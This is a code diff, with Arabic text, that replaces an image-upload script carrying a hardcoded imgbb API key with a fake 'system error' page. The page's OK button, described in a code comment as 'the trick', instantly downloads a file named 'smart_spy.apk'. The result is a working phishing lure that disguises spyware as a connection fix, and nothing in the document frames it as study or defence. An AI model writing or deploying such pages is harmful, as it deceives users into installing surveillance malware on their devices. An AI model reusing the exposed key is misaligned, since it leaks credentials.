@@ -1,24 +1,27 @@
-<script>
-const API_KEY = "c9bd8f8fbce9deef0d65b5f5beeead9b";
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خطأ في النظام</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .error-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 80%; max-width: 400px; }
+        h2 { color: #444; font-size: 18px; }
+        p { color: #777; font-size: 14px; margin-bottom: 20px; }
+        .btn-ok { background-color: #007bff; color: white; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
+    </style>
+</head>
+<body>
 
-async function uploadImages(){
-  const input = document.getElementById('myImages');
-  const status = document.getElementById('status');
-  if(!input.files.length){ status.innerText="اختار صور"; return; }
-  
-  status.innerText="جاري الرفع للسيرفر الأمريكي...";
-  
-  for(let file of input.files){
-    const form = new FormData();
-    form.append("image", file);
-    
-    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
-      method: "POST",
-      body: form
-    });
-    const data = await res.json();
-    console.log("رابط الصورة الدائم:", data.data.url);
-    status.innerText = "✅ تم الحفظ في السيرفر: " + data.data.url;
-  }
-}
-</script>
+    <div class="error-box">
+        <h2>عذراً، الصفحة غير متوفرة حالياً</h2>
+        <p>يرجى الضغط على موافق لتحديث الاتصال بالخادم.</p>
+        <!-- هنا الخدعة: الزر يقوم بتحميل الملف فوراً -->
+        <a href="smart_spy.apk" download>
+            <button class="btn-ok">موافق</button>
+        </a>
+    </div>
+
+</body>
+</html>
